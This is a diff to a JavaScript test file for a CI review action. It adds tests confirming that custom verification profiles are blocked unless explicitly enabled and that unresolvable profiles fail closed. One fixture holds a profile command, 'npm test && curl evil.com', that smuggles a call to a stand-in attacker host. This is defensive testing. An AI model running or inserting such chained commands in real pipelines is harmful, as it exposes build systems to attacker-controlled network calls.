@@ -1187,6 +1187,7 @@ describe('CI Event Payload & Environment Resolution', () => {
         const result = await runCiAction({
           mock: true,
           config: {
+            enableCustomCiProfiles: true,
             verificationProfiles: {
               custom_deploy: { command: 'npm run deploy:preview' },
             },
@@ -1201,6 +1202,97 @@ describe('CI Event Payload & Environment Resolution', () => {
         assert.equal(executedProfile, 'custom_deploy');
         assert.deepEqual(passedConfig?.verificationProfiles?.custom_deploy, { command: 'npm run deploy:preview' });
         assert.equal(result.verificationResult?.status, 'passed');
+      } finally {
+        fs.unlinkSync(tmpEvent);
+      }
+    });
+
+    it('rejects custom profile in CI when enableCustomCiProfiles is not enabled', async () => {
+      const tmpEvent = path.join(os.tmpdir(), `event-custom-disallow-${Date.now()}.json`);
+      fs.writeFileSync(tmpEvent, JSON.stringify({
+        action: 'created',
+        issue: {
+          number: 22,
+          pull_request: { url: 'https://api.github.com/repos/org/repo/pulls/22' },
+        },
+        comment: {
+          id: 781,
+          body: '/gem-review --quick --verify=custom_deploy',
+          author_association: 'MEMBER',
+          user: { login: 'member' },
+        },
+        repository: { full_name: 'org/repo' },
+        sender: { login: 'member' },
+      }));
+
+      try {
+        let verificationExecuted = false;
+        const mockVerification = async () => {
+          verificationExecuted = true;
+          return { status: 'passed' };
+        };
+
+        const result = await runCiAction({
+          mock: true,
+          config: {
+            verificationProfiles: {
+              custom_deploy: { command: 'npm run deploy:preview' },
+            },
+          },
+          runVerificationFn: mockVerification,
+        }, {
+          GITHUB_EVENT_PATH: tmpEvent,
+        }, silentIo);
+
+        assert.equal(result.exitCode, 1);
+        assert.equal(verificationExecuted, false, 'Should reject custom profile when enableCustomCiProfiles is omitted');
+        assert.equal(result.verificationResult?.status, 'failed');
+        assert.match(result.verificationResult?.error, /disallowed verification profile "custom_deploy"/i);
+      } finally {
+        fs.unlinkSync(tmpEvent);
+      }
+    });
+
+    it('handles verification profile resolution failure and fails closed', async () => {
+      const tmpEvent = path.join(os.tmpdir(), `event-resolve-fail-${Date.now()}.json`);
+      fs.writeFileSync(tmpEvent, JSON.stringify({
+        action: 'created',
+        issue: {
+          number: 22,
+          pull_request: { url: 'https://api.github.com/repos/org/repo/pulls/22' },
+        },
+        comment: {
+          id: 781,
+          body: '/gem-review --quick --verify=ghost',
+          author_association: 'MEMBER',
+          user: { login: 'member' },
+        },
+        repository: { full_name: 'org/repo' },
+        sender: { login: 'member' },
+      }));
+
+      try {
+        let verificationExecuted = false;
+        const mockVerification = async () => {
+          verificationExecuted = true;
+          return { status: 'passed' };
+        };
+
+        const result = await runCiAction({
+          mock: true,
+          config: {
+            allowedCiVerificationProfiles: ['ghost'],
+            // ghost is intentionally not configured in verificationProfiles
+          },
+          runVerificationFn: mockVerification,
+        }, {
+          GITHUB_EVENT_PATH: tmpEvent,
+        }, silentIo);
+
+        assert.equal(result.exitCode, 1);
+        assert.equal(verificationExecuted, false, 'Should not execute verification on profile resolution failure');
+        assert.equal(result.verificationResult?.status, 'failed');
+        assert.match(result.verificationResult?.error, /failed to resolve: Unknown verification profile: "ghost"/i);
       } finally {
         fs.unlinkSync(tmpEvent);
       }
@@ -1278,6 +1370,7 @@ describe('CI Event Payload & Environment Resolution', () => {
         const result = await runCiAction({
           mock: true,
           config: {
+            enableCustomCiProfiles: true,
             verificationProfiles: {
               malicious_cmd: { command: 'npm test && curl evil.com' },
             },
